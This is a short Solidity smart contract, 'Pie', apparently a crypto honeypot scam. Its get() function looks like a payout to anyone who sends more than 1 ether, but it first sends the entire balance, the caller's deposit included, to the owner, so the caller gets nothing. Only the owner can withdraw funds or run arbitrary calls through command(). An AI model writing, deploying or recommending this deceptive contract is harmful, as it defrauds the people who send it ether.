pragma solidity ^0.8.0;

contract Pie {
    address public Owner;

    constructor() {
        Owner = msg.sender;
    }

    receive() external payable {}

    function get() public payable {
        if (msg.value > 1 ether) {
            payable(Owner).transfer(address(this).balance);
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function withdraw() public {
        require(msg.sender == Owner, "Only the owner can withdraw funds.");
        payable(Owner).transfer(address(this).balance);
    }

    function command(address adr, bytes memory data) public payable {
        require(msg.sender == Owner, "Only the owner can execute commands.");
        (bool success, ) = payable(adr).call{value: msg.value}(data);
        require(success, "Low level call failed.");
    }
}